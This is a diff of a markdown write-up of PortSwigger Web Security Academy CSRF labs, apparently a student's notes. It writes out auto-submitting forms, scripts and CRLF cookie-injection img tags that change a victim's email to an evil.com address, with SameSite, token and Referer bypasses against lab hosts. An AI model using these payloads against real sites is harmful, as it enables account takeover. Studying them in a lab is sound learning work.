@@ -16,12 +16,12 @@
 
 **Exploit:**
 
-<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
-    <input type="hidden" name="email" value="attacker@evil.com">
-</form>
-<script>
+**<** form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+    **<** input type="hidden" name="email" value="attacker@evil.com">
+**<** /form>
+**<** script>
 document.forms[0].submit();
-</script>
+**<** /script>
 
 ---
 
@@ -35,12 +35,12 @@ document.forms[0].submit();
 
 **Exploit:**
 
-<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+**<** form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="attacker@evil.com">
-</form>
-<script>
+**<** /form>
+**<** script>
 document.forms[0].submit();
-</script>
+**<** /script>
 
 ---
 
@@ -71,8 +71,7 @@ document.forms[0].submit();
 - Use the attacker-controlled CSRF token
 
 **Exploit:**
-
-<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie: csrfKey=ATTACKERKEY; SameSite=None"
+**<** img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie: csrfKey=ATTACKERKEY; SameSite=None"
 onerror="document.forms[0].submit()">
 
 ---
@@ -90,12 +89,12 @@ onerror="document.forms[0].submit()">
 
 **Exploit:**
 
-<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
-    <input type="hidden" name="email" value="attacker@evil.com">
-    <input type="hidden" name="csrf" value="fake">
-</form>
+**<** form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+    **<** input type="hidden" name="email" value="attacker@evil.com">
+    **<** input type="hidden" name="csrf" value="fake">
+**<** /form>
 
-<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie: csrf=fake; SameSite=None"
+**<** img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie: csrf=fake; SameSite=None"
 onerror="document.forms[0].submit()">
 SameSite Cookie Bypass
 
@@ -112,9 +111,9 @@ SameSite Cookie Bypass
 
 **Exploit:**
 
-<script>
-document.location="https://LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@evil.com&_method=POST";
-</script>
+**<** script>
+document.location="https://LAB-ID.web-security-academy.net/my-account/change-email?email=attackerxxx@evil.com&_method=POST";
+**<** /script>
 
 ---
 
@@ -129,9 +128,9 @@ document.location="https://LAB-ID.web-security-academy.net/my-account/change-ema
 
 **Exploit:**
 
-<script>
-document.location="https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@evil.com%26submit=1";
-</script>
+**<** script>
+document.location="https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=attackerxxx@evil.com%26submit=1";
+**<** /script>
 
 ---
 
@@ -147,18 +146,18 @@ document.location="https://LAB-ID.web-security-academy.net/post/comment/confirma
 
 **Exploit:**
 
-<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
-    <input type="hidden" name="email" value="pwned@evil.com">
-</form>
+**<** form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+    **<** input type="hidden" name="email" value="attackerxxy@evil.com">
+**<** /form>
 
-<p>Click anywhere</p>
+**<** p>Click anywhere</p>
 
-<script>
+**<** script>
 window.onclick = () => {
     window.open('https://LAB-ID.web-security-academy.net/social-login');
     setTimeout(() => document.forms[0].submit(), 5000);
 }
-</script>
+**<** /script>
 Header Validation Bypass
 
 ---
@@ -169,4 +168,21 @@ Header Validation Bypass
 
 **Vulnerability:** The request is accepted if the Referer header is missing.
 
-**Technique:** Suppress the Referer header using HTML ??EXPLOIT
+**Technique:** Suppress the Referer header using HTML
+
+**Exploit:**
+**<** html>
+    **<** head> 
+        **<** meta name ="referrer" content="never">
+    **<** /head>
+    **<** body>
+    **<** script>history.pushstate('', '', '/')**<** /script>
+        **<** form action=" https://LAB-ID.web-security-acadamy.net/my-account/change-email" method="POST">
+            **<** input type="hidden" name="email" value="attackerxxy@evil.com" />
+            **<** input type="submit" value="Submit request" />
+        **<** /form>
+        **<** script>
+            document.forms[0].submit();
+         **<** /script>
+     **<** /body>
+ **<** /html>
